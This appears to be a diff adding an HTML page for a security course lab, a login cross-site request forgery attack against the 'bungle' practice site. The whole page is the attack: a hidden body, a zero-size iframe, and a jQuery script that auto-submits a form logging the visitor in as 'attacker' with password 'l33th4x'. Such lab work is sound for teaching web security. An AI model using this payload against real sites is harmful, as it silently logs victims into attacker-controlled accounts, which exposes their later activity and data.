@@ -1,0 +1,21 @@
+<html>
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+
+<body style="display: none;">
+    <iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
+    <form id="form" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post"
+        target="dummyframe">
+        <input id="username" name="username" value="attacker" />
+        <input id="userpass" name="password" value="l33th4x" />
+    </form>
+</body>
+<footer>
+    <script>
+        $('#form').submit();
+    </script>
+</footer>
+
+</html>
